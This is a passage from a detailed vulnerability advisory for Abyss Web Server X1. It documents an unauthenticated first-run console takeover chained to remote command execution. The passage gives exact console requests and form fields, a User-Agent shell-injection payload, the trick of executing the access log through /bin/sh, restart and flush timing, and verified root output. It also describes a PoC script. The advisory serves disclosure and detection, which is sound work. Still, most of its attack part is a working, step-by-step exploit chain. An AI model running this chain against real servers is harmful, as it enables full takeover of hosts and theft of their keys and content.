The response is `200` and the request-serving slave process bounces: the service log records a second
startup banner, and the listener on port 80 goes down and comes back up. Only the *new* generation writes
into the newly configured log destination. That generation boundary is not cosmetic - it is the timing
property that an early verification round got wrong, and section 9 treats it in detail.

### Sink Identification — execution identity of the child process

When a request arrives for a path whose extension is bound to an interpreter, the product starts a CGI
child. The server's own CGI error log names the executing command line explicitly, which is the cleanest
available evidence of the child's identity in a stripped binary:

```
CGI: [/bin/sh x.log ]	URI: /x.log	Broken pipe
```

and immediately around it, line-numbered diagnostics from the child itself:

```
x.log: line 1: 127.0.0.1: command not found
x.log: line 2: 127.0.0.1: command not found
```

Three things are established by those two fragment types together. The child's command line is
`/bin/sh x.log` - the shell is invoked with the log file as its script argument, so the shell reads the
whole file rather than a single line, and argv splitting on the request line is irrelevant. The shell is
executing the log file line by line, treating each leading field (`127.0.0.1`) as a command word and
reporting it as not found; those errors do not stop execution of later lines, which is why a noisy log
prefix is harmless. And the child runs with the identity of the server process, confirmed by the marker
file's ownership and contents in section 9; no setuid, no privilege boundary and no sandbox is crossed,
because the product's own scripting feature is doing exactly what it was configured to do.

### Sink Identification — sibling sinks, and whether they are proven

Being explicit about siblings prevents the finding from being over-read in either direction.

| Sibling candidate | Status | Basis |
|---|---|---|
| SSI `execcmd` (`<!--#exec cmd=...-->` in `.shtml`) | **Not proven as an independent chain**; classified as the same root-cause family | the configuration bit defaults to off, and firing it needs a `.shtml` file on disk; with no upload surface, the only attacker-controlled way to place file content is the log carrier already used here |
| Private-key import textarea (`$contents`) | Refuted | PEM parsing is strict; fabricated content is rejected with `Key creation failed: unsupported` |
| Certificate path construction containing traversal sequences | Not proven | a string-level candidate in the certificate slot; no write effect observed, and pursuing it needs disassembly of a stripped image |
| Upgrade package route | Refuted for upload purposes | no multipart surface exists anywhere in the console |
| Reverse-proxy `CONNECT` client semantics | Refuted for this purpose | no open-proxy configuration surface in the default configuration; not reached |
| Parser memory safety (chunked state machine, multipart ranges, `Expect`, HTTP/2 glue) | Not attempted | the CVE-2021-3328 family requires destructive fuzzing plus memory observation; reported to the vendor as a hardening target, not claimed here |
| A second authenticated RCE primitive distinct from the three forms above | Not found | the scripting subtree's execution-relevant knobs are exactly sinks 1-3, and the remaining write surfaces are ordinary configuration fields |

The honest summary is that the chain documented here covers the product's configuration-to-execution
surface completely for the shapes we could observe behaviourally, and that nothing else in that surface was
proven independently exploitable.

## 6. Source Identification

### Source Identification — the tainted input and its transport

The tainted input is the `User-Agent` request header on an ordinary HTTP request to the serving listener,
and the transport is the product's own access logging. The host log format selected by the console form is
`.combined`, whose output line shape is:

```
<client-ip> <ident> <user> [<timestamp>] "<method> <uri> <protocol>" <status> <bytes> "<referer>" "<user-agent>"
```

Verified against the running product, a single request produced exactly this line in the redirected log
file (timestamp field abbreviated here, request identifiers generalised):

```
127.0.0.1 - - [<timestamp>] "GET /nonexistent-probe HTTP/1.1" 404 336 "" "zz"; echo uid=$(id) > <marker-path> 2>&1; #"
```

Three properties of that line make it a command-injection source rather than merely a logging curiosity:

1. **The field is fully attacker-controlled.** `User-Agent` arrives from the client and is written out as
   received. No truncation, no character filtering, no control-character sanitisation and no quote escaping
   were observed between the request header and the file byte.
2. **The field is placed inside a double-quoted context by the log format itself.** The quoting is a
   property of the combined format, not of the payload, which means the writer believes it is delimiting
   data. A reader that is a shell does not share that belief.
3. **The status code does not matter.** A `404` response was used so the request would have no other
   effect on the target, and the log line is written for failed requests just as for successful ones - the
   request only has to be *logged*.

The line is one of several; a verification round that ran the smuggling request twice, fired the CGI once,
ran the negative control and re-fired left five lines in the file, ordered as: new-generation probe,
payload smuggling, first CGI trigger, control smuggling (same payload, no trigger), determinism re-trigger.
The line count growing from 2 to 4 between CGI fires, with the child's `command not found` diagnostics
tracking it one-for-one, is a direct causal record: the shell re-reads the file on every request.

### Source Identification — sanitization that exists, and what it is for

Sanitisation on this path is essentially absent, but two mechanisms exist nearby and it is worth being
precise about what they do and do not cover, because a reader might otherwise assume they were defeated:

- **Request-level parsing and quoting of the header for the HTTP protocol itself.** The parser handles the
  header as a protocol field correctly; the payload does not confuse the HTTP layer, does not smuggle a
  second request and does not need to. It is written to the log intact. This is not a bypass of any
  HTTP-level control - it is the intended behaviour of a logger.
- **The `antihack` protection system**, which is a request-filtering/blocking subsystem. It defaults to
  `enabled no` in the generated configuration, so it did not evaluate the payload at all. Enabling it is a
  hardening measure and its effect on this payload was not measured; section 11 lists it accordingly rather
  than claiming it as a mitigation that was tested.

The log writer performs no escaping of quotes or of shell metacharacters, and no length limit was observed
that would truncate a payload of this size. The `.combined` format's own quoting is the only structural
element between the header and the file - and that quoting is what creates the shell context.

### Source Identification — validation that is absent

The absence is more interesting on the configuration side than on the logging side, because the logging
side is arguably correct behaviour. What is missing is any cross-field reasoning between the three console
forms:

| Missing validation | Where it would live | Effect of its absence |
|---|---|---|
| Reject or warn when an interpreter extension could coincide with a server-written file (a log extension, an upload extension, a temp-file extension) | interpreter binding form | the log becomes an executable path |
| Reject or warn when binding a general-purpose shell (`/bin/sh`, `/bin/bash`, `cmd.exe`) as an interpreter for a data extension | interpreter binding form | an access log is executed as a script |
| Restrict the log destination to a log directory, or at least refuse destinations inside a CGI scope or the document root | host log form | server-written content lands where requests can reach it |
| Refuse a CGI script-path scope of `/` without an explicit acknowledgement | scripting paths form | every path, including log files, becomes script-eligible |
| Require local or installer-bound authority to create the first console credential | credential endpoint | the first network arrival becomes the administrator |
| Normalise and canonicalise any path taken from the console file browser before writing it | console path controls | traversal-shaped and out-of-tree paths reach the configuration |

None of these is exotic. Each is a single check on a form that already validates its own field in
isolation, and each one alone would break this chain.

## 7. Data Flow

### Data Flow — end-to-end chain

```
[FIRST RUN]  server starts, generates abyss.conf
             <console> has no <login>, no <password>          (to-be-armed state)
             terminal: "A configuration file was created. You should now browse
                        http://127.0.0.1:9999 to continue with the console
                        access configuration."
                |
[P1 TAKEOVER]  GET /console/          -> 302 -> /console/language  (unauthenticated)
               POST /console/language (button NAME=/console/language/en VALUE=English) -> 302
               GET /console/credentials -> 200 with creation form + $$xxvxd token
               POST /console/credentials (login, password/$pass1, password/$pass2, <token>bok)
                                        -> 302; abyss.conf gains
             <login>...</login> <logincasesensitive>yes</logincasesensitive>
             <password><md5-digest></password>
                |
[GATE]         GET /console/credentials without a credential -> 401
             WWW-Authenticate: Basic Realm="Abyss Web Server Console"   (window is closed, one-shot)
                |
[P2 CONF]      using Basic auth with the credential just created:
               POST /hosts/host@0/edit/scripting/paths/path@0/edit   vpath=/ type=0      -> 302
                     -> <paths><path><vpath>/</vpath><type>0</type>...</path></paths>
               POST /hosts/host@0/edit/log   file=<document-root>/x.log format=.combined -> 302
                     -> <log><file>...</file><denied/><format>.combined</format></log>
               POST IB (interpreters/interpreter@0/edit)  interface=0 file=/bin/sh type=0 -> 302
               POST IB + extensions.badd=Add              -> 302 -> XP (ext@0/edit)
               POST XP  ext=log                           -> 302
                     -> <interpreters><interpreter><file>/bin/sh</file>...<ext>log</ext>
                |
[P2 RESTART]   GET /  (notice: "The configuration has changed. Press [Restart] ...",
                       host status "Running(Updated)")
               POST / $$xxvxd + /restart=Restart -> 200; slave bounces; second startup banner
               wait: listener down -> listener up -> new generation confirmed writing x.log
                |
[P3 SMUGGLE]   GET /nonexistent-probe  with  User-Agent: zz"; <command>; #
                                        -> 404; access line appended to <document-root>/x.log
                |
[P3 FIRE]      GET /x.log  -> vpath=/ scope + ext=log binding match
                            -> child process /bin/sh x.log
                            -> shell reads the log file line by line
                            -> the semicolon segment of the payload line executes
                            -> HTTP 500 with the standard error page (shell output is not
                               CGI-conformant; the 500 is the appearance of success, not failure)
                |
[OUTCOME]      the injected command runs as the identity of the server process
```

### Data Flow — properties of the chain worth naming

**It is a single-direction chain with no loops and no secrets.** Every step consumes the product of the
previous step. Nothing is forged, replayed, guessed or leaked: the credential used in the second half was
created in the first half. That single-direction property is why the chain cannot be broken by fixing an
authentication check - there is no authentication check to fix, only an endpoint that should not be
creatable by the network.

**The tainted data crosses a file, not a memory buffer.** The bytes travel
`User-Agent` header -> log writer -> file -> shell `read` from disk. There is no in-process path from the
request parser to the execution point. This is what makes timing an engineering concern (section 8) rather
than a race condition in the classic sense: the payload must be flushed before the fire request arrives,
because two processes communicate through a file.

**Generation scoping is real and observable.** Only the process generation started after the restart writes
to the new log destination. The verification that mattered was not "the port came back" but "a request with
a distinguishing `User-Agent` appears in the new file", which is a positive test of the redirection rather
than of availability.

**Idempotence.** Firing `GET /x.log` twice executes the payload twice, and the second execution produces
byte-identical output because the log line is still there and the shell re-reads the whole file. The
payload is therefore persistent inside the log file until the log is rotated or truncated - a property an
attacker can exploit for repeated execution without any further console access.

**The `500` is a success indicator.** `/bin/sh` writes no CGI headers, so the product cannot construct a
valid CGI response and answers with its standard error page (a 348-byte body was observed) while the CGI
log records `Broken pipe` for that invocation. A defender scanning logs for `200` responses will not see
this as a script execution; a defender reading `cgi.log` will. Section 10 develops the detection angle.

## 8. Exploit Construction

The PoC delivered with this advisory is
`exploit/aprelium_abyss_web_server_firstrun_console_takeover_conf_to_cgi_root_rce.py`: standard library
only, no third-party dependency, no browser, no disassembly. It drives the whole chain over HTTP and
reports the executing identity from a non-destructive marker command.

### Exploit Construction — step sequence

| Step | Request | Expected result | What the PoC asserts |
|---|---|---|---|
| 0 window probe | `GET /console/` then `GET /console/credentials` on port 9999 | `302` to `/console/language` or `/console/credentials`, then `200` | if the endpoint answers `401`, the console is already armed: exit non-zero with an explicit message and change nothing |
| 1 language | `GET /console/language`, `POST /console/language` with `$$xxvxd` and `/console/language/en=English` | `302` | optional pre-step for never-configured instances |
| 2 takeover | `POST /console/credentials` with `login`, `password/$pass1`, `password/$pass2`, `<token>bok` | `302` | credential now exists in the configuration |
| 3 gate | `GET /console/credentials` with no credential | `401` + `WWW-Authenticate: Basic` | one-shot window semantics confirmed before proceeding |
| 4 CGI scope | `POST /hosts/host@0/edit/scripting/paths/path@0/edit` with `vpath=/`, `type=0`, `xsendfile=no`, `outputbuffersize=0` | `302` | `<paths>` block written |
| 5 log destination | `POST /hosts/host@0/edit/log` with `file=<absolute path>`, `format=.combined` | `302` | `<log><file>` written |
| 6 interpreter | `POST` to the interpreter edit route with `interface=0`, `interface/0Pane/file=/bin/sh`, `checkexists=yes`, `checkexists.submitted=yes`, `type=0`, `updatepaths.submitted=yes`; then `extensions.badd=Add`; then `POST` to the extension route with `ext=log` | `302`, `302`+`Location`, `302` | `<interpreters>` block contains `/bin/sh` and `<ext>log</ext>` |
| 7 restart | `GET /` to read the token and the config-changed notice, then `POST /` with `/restart=Restart` | `200` | listener down, listener up, new generation confirmed |
| 8 smuggle | `GET /nonexistent-probe` with `User-Agent: zz"; <command>; #` | `404` | payload text present in the log file (when locally readable) |
| 9 fire | `GET /x.log` | `500` with the standard error page | marker reported; the `500` is expected |
| 10 control | same `User-Agent` to a different nonexistent path, **no** fire request | `404` | after a wait, no execution occurred |
| 11 determinism | re-fire `GET /x.log` | `500` | the marker reappears with identical content |

### Exploit Construction — payload engineering constraints

The payload is a three-part construction, and each part has a specific job:

```
zz"; <command>; #
```

- `zz` exists so that the log format's opening quote produces a harmless shell word. The shell encounters
  `"zz"` as a token and, together with the preceding address, timestamp and status fields on the line,
  reports each as `command not found`. Those errors are diagnostic noise only; a shell executing a script
  continues past a failed command word, which the CGI error log confirms line by line.
- `"; ` closes the quoted context that the log format opened and separates statements. From here the shell
  is parsing attacker bytes. Because `/bin/sh` is reading the *file* rather than receiving `-c`, there is no
  argv word-splitting limit and no need to escape for a second quoting layer: spaces, redirections and
  command substitution (`$(...)`) all work as they would in a normal script line.
- `<command>;` is the injected statement. In verification it was
  `echo uid=$(id) > <marker-path> 2>&1` - a marker write with the error stream captured, so that a
  permission failure would leave evidence rather than silence. The doubled `uid=` prefix in the marker
  content is an artefact of that construction (`echo uid=` followed by the output of `id`, which itself
  begins with `uid=`), and it is a useful authenticity fingerprint: it is exactly what this payload shape
  produces and not what a hand-edited file would contain.
- `#` comments out the remainder of the line - the log format's own closing quote and everything after it.

Constraints worth naming for anyone extending this: the command must not contain a newline (it would split
into separate log-line-independent statements and could still work, but the resulting file is no longer one
line); it must not depend on a current working directory (the CGI child's working directory is the script's
directory, so absolute paths are safer); and it should be non-destructive, which is why the shipped default
writes a marker file rather than touching the target's content.

### Exploit Construction — the timing engineering that makes the chain reliable

Two timing facts were learned the hard way, and both are implemented in the delivered PoC rather than left
as prose:

**The restart bounce window.** `POST /` answers `200` while the *previous* generation is still serving for
a short interval. An early round of verification probed immediately after the restart, was served by the
old generation, and therefore had its payload written into the previous log destination: the injected line
appeared in the old access log, the new log file stayed empty and no execution occurred. The fix is a
three-beat wait - observe the listener going down (a TCP connection refusal proves the bounce is actually in
progress), observe it coming back, then positively verify the new generation by sending a request with a
distinguishing `User-Agent` and confirming that string appears in the newly configured log file. Failure
mode evidence from that early round survived as two `404` lines in the pre-restart access log, which is
itself a demonstration that generation scoping is real.

**Log flush latency.** A `404` response returning to the client does not mean the access line is on disk
yet. The PoC polls the configured log file for the payload text at a quarter-second interval before firing
the CGI request; in verification the line landed within roughly two seconds. Without that poll the fire
request can execute a log file that does not yet contain the payload, producing a `500` with no marker,
which looks identical to failure.

**The page token.** `$$xxvxd` is a per-server-run value present as a hidden field on every console form and
as a prefix in submit control names (`/<page>/<token>bok`). It is shared across clients and sessions rather
than per-request, so the PoC parses it from the page it is about to submit rather than trying to reuse one
across a restart boundary. It is not a security control: there is no capability attached to knowing it, and
in the first-run state the endpoint it guards is open to everybody anyway.

### Exploit Construction — what the exploit deliberately does not do

The delivered PoC is deliberately narrower than an operational tool, and the narrowing is intentional:

- **It does not start, stop or install the server.** It is a client. The verification environment's own
  isolation wrapper (a dedicated network namespace with only loopback up) existed because that environment
  started the product itself; a client-side PoC has no equivalent obligation, but it does keep the
  loopback-by-default rail described next.
- **It refuses a non-loopback target unless explicitly permitted.** The default target is `127.0.0.1`, and
  driving a remote host requires an explicit command-line flag. The verification rail that restricted the
  research script to loopback targets is preserved as an opt-in rather than removed.
- **It does not implement a callback listener, a reverse shell, a persistence mechanism or an
  interactive shell.** None of those were part of the verification, and adding them would make the PoC a
  weapon rather than a proof of the chain.
- **Its default payload writes a marker file and reports it.** It is non-destructive by construction; the
  command is overridable for authorised testing, and the shipped default is an `id` capture.
- **It exits non-zero and changes nothing when the console is already armed.** The window probe is the first
  action, so the tool cannot be pointed at a production instance that is past its first run and silently
  start reconfiguring it. The `--probe` mode performs only that check.
- **It publishes no credential.** Login and password are command-line arguments; the defaults are obvious
  placeholders. Because step 2 *does* write a credential into the target's configuration, the script says
  so loudly in its usage text and again in its closing report, and it restores a supplied pristine
  first-run configuration on cleanup when one is provided.
- **It performs idempotent cleanup**: removing the marker and, when the log file is locally reachable, the
  log file it caused to be written, then restoring the configuration template if the operator supplied one.
  Cleanup is skipped only on explicit request, which is the mode used to leave a scene for inspection.

## 9. Dynamic Verification

### Dynamic Verification — environment

| Element | Value |
|---|---|
| Product under test | Abyss Web Server X1 2.16.22.0, Linux, x64 native image from the official release tree |
| Image | `abyssws-x64`, ELF 64-bit stripped, 5700872 bytes, BuildID `d7545bad2f47fb7b9f269ae98cb7baea1594fa12` |
| Instance | a live server process started from a working copy of the unpacked release tree, answering real HTTP traffic |
| Start command | `./abyssws-x64 -c <conf> --allow-root` (the `--allow-root` flag is a product CLI option; see section 10 on identity) |
| Configuration state | first-run, restored before each round from a captured copy of the product's own generated bootstrap configuration (3222 bytes, `<console>` with no `<login>` and no `<password>`); previous round's marker, log file and persistence data removed first |
| Listeners | host on port 80, console on port 9999, both `bindip` `*` by default |
| Network isolation | the whole run - server and client - inside a dedicated network namespace whose only interface was loopback, brought up before the server started |
| Client driver | two independent execution paths: a scripted standard-library driver (the logic now shipped as the PoC) and a manual request sequence driven with command-line HTTP tooling |
| Observation channels | HTTP responses, plus server-side files read on the same host: the configuration file, the access log, the CGI error log and the marker file |

This was a real product instance, not an emulation and not a reimplementation. Every request was answered
by the vendor's stripped binary, and every server-side artefact quoted below was read off that instance's
own disk.

### Dynamic Verification — the triggering request

The two requests that constitute the execution, verbatim in shape:

```
GET /nonexistent-probe HTTP/1.1
Host: 127.0.0.1
User-Agent: zz"; echo uid=$(id) > <marker-path> 2>&1; #
Accept: */*
```

answered `404` with a 336-byte body, and - after the log line had flushed -

```
GET /x.log HTTP/1.1
Host: 127.0.0.1
```

answered `500` with a 348-byte standard error page. Neither response indicates failure: the first only has
to be logged, and the second only has to have caused `/bin/sh` to run.

### Dynamic Verification — observed output

Server-side, the redirected access log contained five lines in the following order, each one accounted for
by a step of the run (timestamp fields abbreviated here):

```
127.0.0.1 - - [<timestamp>] "GET /index.html HTTP/1.1" 200 1309 "" "new-generation-probe-<n>"
127.0.0.1 - - [<timestamp>] "GET /nonexistent-probe HTTP/1.1" 404 336 "" "zz"; echo uid=$(id) > <marker-path> 2>&1; #"
127.0.0.1 - - [<timestamp>] "GET /x.log HTTP/1.1" 500 348 "" "abyss-poc/1.0 (authorized research)"
127.0.0.1 - - [<timestamp>] "GET /nonexistent-probe-control HTTP/1.1" 404 336 "" "zz"; echo uid=$(id) > <marker-path> 2>&1; #"
127.0.0.1 - - [<timestamp>] "GET /x.log HTTP/1.1" 500 348 "" "abyss-poc/1.0 (authorized research)"
```

Top to bottom, those are: the new-generation probe that proves the restart actually redirected logging, the
payload smuggling, the first CGI fire, the control smuggling (identical payload, deliberately not fired),
and the determinism re-fire. The log file was 626 bytes and mode `-rw-------`, owned by the identity the
server ran as.

The CGI error log for the same interval contained, interleaved:

```
x.log: line 1: 127.0.0.1: command not found
x.log: line 2: 127.0.0.1: command not found
[<timestamp>]	CGI: [/bin/sh x.log ]	URI: /x.log	Broken pipe
x.log: line 1: 127.0.0.1: command not found
x.log: line 2: 127.0.0.1: command not found
x.log: line 3: 127.0.0.1: command not found
x.log: line 4: 127.0.0.1: command not found
[<timestamp>]	CGI: [/bin/sh x.log ]	URI: /x.log	Broken pipe
```

The `CGI: [/bin/sh x.log ]  URI: /x.log` lines are the product's own engine naming the child it spawned,
and the `line N: ... command not found` lines are the shell's own diagnostics, incrementing from two lines
to four as the log file grew between fires. That increment is causality, visible in the log: each fire
re-reads the whole file and re-executes every line.

The marker file, read independently of any HTTP response:

```
uid=uid=0(root) gid=0(root) groups=0(root)
```

43 bytes, owned by root. And the configuration file's three written blocks, read back after the run:

```
<paths><path><vpath>/</vpath><type>0</type><xsendfile>no</xsendfile>
       <outputbuffersize>0</outputbuffersize></path></paths>
<log><file><document-root>/x.log</file><denied/><format>.combined</format></log>
<interpreters><interpreter><interface>0</interface><file>/bin/sh</file>
       <checkexists>yes</checkexists><type>0</type><updatepaths>yes</updatepaths>
       <ext>log</ext></interpreter></interpreters>
```

plus, on the console node, the credential created by the unauthenticated POST: a `<login>` element,
`<logincasesensitive>yes</logincasesensitive>` and a `<password>` element holding a 32-character MD5
digest, with `bindip` `*` and the RFC1918 allow ranges unchanged from the generated defaults.

### Dynamic Verification — the negative control and why it matters

The negative control isolates causality in a chain that has two independently necessary links: smuggling the
bytes into the log, and causing the log to be executed. Both were present in the run above, so the control
removes one.

The control deleted the marker, re-sent the *same* `User-Agent` payload to a different nonexistent path -
visible as the fourth log line above, byte-identical in its payload portion - and deliberately did **not**
request `/x.log`. After a wait long enough to cover the observed flush latency, the marker did not exist.
No execution occurred. A request carrying shell metacharacters in a header does not execute anything by
itself, no matter how many times it is logged.

The follow-up step then requested `/x.log` again, and the marker reappeared with byte-identical content.
That is the determinism half of the control: the payload was already in the file, so re-firing reproduced
the result exactly. Together the two steps show that the file write is necessary but not sufficient, the
CGI fire is necessary but not sufficient, and the pair is sufficient and repeatable.

A third control is the arming gate. After the credential was installed, an unauthenticated
`GET /console/credentials` returned `401` with
`WWW-Authenticate: Basic Realm="Abyss Web Server Console"`. This was observed in every round, and an
independent manual request sequence reproduced the same response. It establishes that the first-run window
is one-shot and closes at the moment of the takeover - the attacker's own POST is the event that closes it -
rather than being a persistent unauthenticated endpoint.

Finally, spoofing was excluded by construction: the configuration contents and the marker file were each
read on the server side, and the CGI error log independently corroborated both the child's command line and
the shell's line-by-line execution. No claim in this section rests on a client-observed value alone.

### Dynamic Verification — number of successful detonations, stated exactly

Three detonations produced the `uid=0(root)` marker:

1. a manual request sequence driven end to end with command-line HTTP tooling against the live instance,
   which was the first confirmation of the chain and left its own marker with identical content;
2. a fully automated round of the scripted driver, including its own cleanup, exiting with a zero return
   code;
3. a second fully automated round of the same driver with cleanup disabled so that the scene could be
   inspected afterwards, also exiting zero. That is the round whose server-side artefacts are quoted above.

Rounds two and three produced line-for-line identical client-side output apart from the omitted cleanup
segment and the per-server-run page token, which differs between runs by design. A third scripted round,
run *before* the restart-timing fix described in section 8, failed: it was served by the pre-restart
generation, wrote the payload into the previous log destination, and produced no marker. That failure is
reported because it is evidence in itself - it proves the log redirection is generation-scoped - and because
the two lines it left in the old access log are the reason the delivered PoC waits the way it does.

So: three successful detonations (one manual, two scripted) plus one instructive failure. The shipped PoC
logic itself is the logic that ran green twice; the manual round used the same requests in the same order,
issued by hand.

### Dynamic Verification — what was driven from a separate network host, and what was not

Nothing was. This is the clearest and most important negative in the verification record:

- the server process and the HTTP client ran on the same host, inside the same dedicated network namespace,
  whose only interface was loopback; every request in every round was sent to `127.0.0.1`;
- a listener survey performed in the host's root namespace while the run was in progress returned zero hits
  on either product port, which is the isolation evidence: a `bindip` of `*` inside a namespace with no
  other interface cannot be reached from outside it;
- the forensic reading of the marker file, access log and CGI log was performed on the same host from the
  root namespace (the namespace boundary affects networking, not the filesystem), after the round that
  deliberately preserved state.

Consequently the claim "an attacker on the same private network can do this" is **argued from shipped
artefacts**, not demonstrated from a second machine: the configuration binds both listeners to every
interface, and the console's `ipcontrol` allow list covers loopback plus all of RFC 1918 plus IPv6
ULA/link-local with no deny rules, and the same literals appear inside the binary images. A two-host
detonation would be the direct demonstration and was not performed, because running the product with its
default all-interface bind on a reachable network was not acceptable for this work. Section 10 rates
reachability strictly within that boundary.

### Dynamic Verification — boundaries of what was verified

Equally explicit about what was *not* exercised:

- the x86 image in the same release tree was not executed; the Windows build was not obtained for testing;
  the paid X2 edition was not tested; earlier 2.x versions were not tested. None is claimed as affected.
- no attack was launched from a second host, as described above;
- the effect of enabling the `antihack` protection system on this payload was not measured;
- the behaviour of the chain against a target whose log rotation is active, whose log destination is on a
  different filesystem, or whose document root is not writable by the server user was not measured;
- no privilege escalation beyond the server process identity was attempted, and none is claimed. The
  product is a single-process C server model with no setuid helper chain observed, so an authenticated
  post-exploitation escalation path was not expected and was not sought;
- the parser memory-safety family (chunked encoding, multipart ranges, `Expect`, HTTP/2 glue) was not
  fuzzed; it is listed for the vendor as a hardening target, not as a finding.

## 10. Reachability and Security Impact

### Reachability and impact — network position

The chain has two listeners with different exposure, and only one of them gates the attack.

The **console on port 9999** is the gate. It binds every interface by default and the shipped
documentation presents that as the recommended setting, but its `ipcontrol` allow list restricts source
addresses to loopback, the three RFC1918 IPv4 ranges and IPv6 unique-local/link-local, evaluated on the
connected socket peer. Public-internet source addresses are refused by default, and forwarding headers do
not change the evaluation. The correct network-position statement for a default installation is therefore:
**any host sharing a private network with the server**, which in practice means the whole office LAN, the
whole home LAN, every tenant on a shared management VLAN, every container on a bridge network and every
instance on a cloud VPC subnet. That is a wide population, but it is an adjacent network position and not
an internet-facing one, and the published vector says so.

The **serving listener on port 80** is the ordinary product surface and in most deployments is deliberately
reachable from wherever the site is published. It carries the last two steps of the chain (the smuggling
request and the CGI fire) and requires no authentication. But it cannot carry the configuration write, so
an attacker who can only reach port 80 cannot build the chain: the anonymous GET fires a shell only after
somebody with console access arranged for it to do so.

Deployment shapes that widen the console's reach beyond the private set - each argued rather than measured,
and each a change in the operator's configuration rather than in the product: a port forward or NAT rule
publishing 9999; a reverse proxy on the same host relaying public clients to the console, where the socket
peer becomes the proxy's own private or loopback address and `ipcontrol` passes without any header logic
being consulted; a host whose public address happens to fall inside one of the permitted ranges; a hosting
or appliance package that runs the server inside a private bridge but exposes a management path to it; and
any operator who follows the shipped recommendation to bind the console to `*` while placing the host on a
network whose trust level does not match. Section 12 publishes a labelled conditional score for that
population instead of folding it into the headline.

### Reachability and impact — what the achieved identity controls

Whoever wins the window holds a console administrator credential that is *indistinguishable* from the
legitimate one: it is the same configuration node, the same MD5 storage, the same Basic realm. There is no
flag, no marker and no log entry that differentiates a minted administrator from an intended one, and the
legitimate administrator who arrives second is locked out rather than alerted - a `401` on their first visit
is the only symptom, and it is ambiguous with a typo.

From that position the achieved identity controls, through supported configuration forms:

- **the entire configuration tree** of every virtual host - scripting, interpreters, logging, TLS
  certificates and private keys, access control, proxying, and the console's own listener settings,
  including the ability to widen or narrow `ipcontrol` and to change the console port and bind address;
- **arbitrary command execution** as the server process identity, by the mechanism documented here;
- **the served content**, both by configuration and by command execution: every document, every TLS private
  key the console can reach, and any data the server user can read on the host;
- **persistence**, in at least four independent ways observed or implied by the forms: the minted console
  credential itself survives restarts; the interpreter binding and the CGI scope survive restarts and are
  invisible to a casual audit; the payload remains in the log file and re-executes on every request to that
  path until the log is rotated or truncated; and a scheduled task or startup unit can be installed by the
  executed command with no further product interaction;
- **availability**, trivially - the console can stop hosts, restart the service at will, and the executed
  command can terminate the process or exhaust the disk (the arbitrary-path log write alone permits disk
  filling as a standalone primitive);
- **the host**, to the extent the server's identity permits. In our verification that identity was uid 0,
  which is the whole host.

### Reachability and impact — the privilege question, answered in full

Root was reached, and the reason must be stated plainly rather than generalised. The marker content
`uid=uid=0(root) gid=0(root) groups=0(root)` and the marker file's root ownership are facts about the
instance we tested. That instance was started with the product's own `--allow-root` CLI flag from a working
copy of the release tree, on a host where the process was launched by a privileged user. **The sources do
not establish that root execution is the shipped default runtime identity on Linux**, and this advisory does
not claim it.

What the sources do establish, and the distinction matters:

- **artifact-backed**: the flag `--allow-root` exists in the product's CLI family, the process accepted it,
  and the resulting CGI child ran with that identity;
- **characterised but not artifact-proved**: the notes from verification describe a dedicated low-privilege
  `abyss` account as the identity intended for production deployments. We did not locate a shipped artefact
  (an install script, a unit file, or a `<user>`-style configuration node in the generated default
  configuration) that proves the default runtime identity is that account, so we do not publish it as a
  fact;
- **structural argument, not a measurement**: the generated default configuration binds the host listener
  to port 80, and on Linux a process binding a port below 1024 must start with root privileges or hold
  `CAP_NET_BIND_SERVICE`. Whether the product then drops privileges - and to which identity - depends on
  how the deployment starts it (a systemd unit with `User=`, an init script, a manual start, the vendor's
  autostart setup routine, or a `--allow-root` start). A stock deployment that simply runs the binary with
  enough privilege to bind port 80 and does not drop is a realistic shape, not an exotic one.

The honest privilege ceiling is therefore: **arbitrary command execution as the identity of the server
process, which is deployment-dependent; uid=0(root) was observed on the instance we verified, and a
dedicated `abyss` account is the identity described for production but not proven as the shipped
default.** The severity assessment does not depend on resolving that question, and section 12 explicitly
does not raise or lower any metric on account of it: either identity yields full compromise of the product,
its configuration, its keys and its served content, and root additionally yields the host. Directory and
file naming in this advisory reflects the identity that was actually observed.

### Reachability and impact — the window, and what it costs an attacker

The precondition that narrows this finding is the window, and it is fair to be exact about what is and is
not known:

- **Established**: the window exists from the moment the configuration is generated until a client
  completes a credential POST; it is one-shot per configuration state (the endpoint answers `401`
  afterwards, measured repeatedly); and it re-opens whenever the credential nodes are removed, which is
  also the product's own documented recovery for a forgotten console password. A CLI redeployment that
  regenerates the configuration, an operator who deletes those nodes following the documentation, a host
  image rebuilt from a pristine tree, or a container started from a fresh configuration image all re-open
  the window.
- **Not established and not estimated**: how long the window stays open in a real deployment. The sources
  contain no field measurement of the interval between installation and arming, and this advisory invents
  none. Different deployment shapes differ by orders of magnitude: an administrator who follows the startup
  message immediately closes the window in seconds; a package installed by automation, an appliance staged
  in a warehouse, a development instance left running, or a container redeployed from a pristine image on
  every restart may leave the window open indefinitely.

That last shape is why a high-complexity rating is the honest headline rather than a concession: the attack
needs the attacker to arrive before the administrator and, in a redeploy-from-pristine-image shape, to keep
arriving - which is trivially automatable by an attacker who can poll the endpoint, since the state is
cheap to read. The window state is discoverable without authentication at all: an unauthenticated
`GET /console/` answers a distinctive `302` while the instance is unarmed and `401` once it is armed, so an
attacker can survey a private network continuously for unarmed instances and race any administrator to
them. The discovery primitive is itself reported to the vendor separately, because it converts the race
from luck into monitoring.

### Reachability and impact — detection notes

Detection is genuinely difficult, and defenders should assume that. Every request in the chain is a
legitimate use of a documented product feature:

- the takeover is a `POST` to the console's credential form, indistinguishable from an administrator's
  first setup;
- the configuration writes are ordinary authenticated console form submissions, with the same content type
  and the same shape as any administrator session;
- the restart is the product's own restart button;
- the smuggling request is an anonymous `GET` for a path that does not exist, with an unusual
  `User-Agent` - a `404` among many `404`s;
- the fire request is an anonymous `GET` for a file under the document root, answered `500`.

The signals that do exist, in order of value:

1. **`cgi.log` entries naming a non-script file**: `CGI: [/bin/sh x.log]  URI: /x.log` is the server telling
   you a shell was invoked on a log file, and the accompanying `x.log: line N: ... command not found`
   diagnostics are the shell's own confession. This is the highest-fidelity indicator available.
2. **`500` responses for paths ending in a data extension** (`.log`, `.txt`, `.tmp`, `.bak`) - the product
   answers `500` whenever a bound interpreter fails to produce CGI headers, so an unexpected `500` on a
   data file is a strong hint that something is bound to it.
3. **Configuration drift**: a `<paths><path><vpath>/</vpath>` entry, an interpreter whose `<file>` is a
   shell, or a `<log><file>` pointing inside the document root should each fail an audit on their own
   merits.
4. **An administrator credential nobody recognises**, or a legitimate administrator receiving `401` on
   first visit to a freshly deployed instance.
5. **Access-log lines whose `User-Agent` contains shell metacharacters** - `";`, `#`, `$(`, redirections -
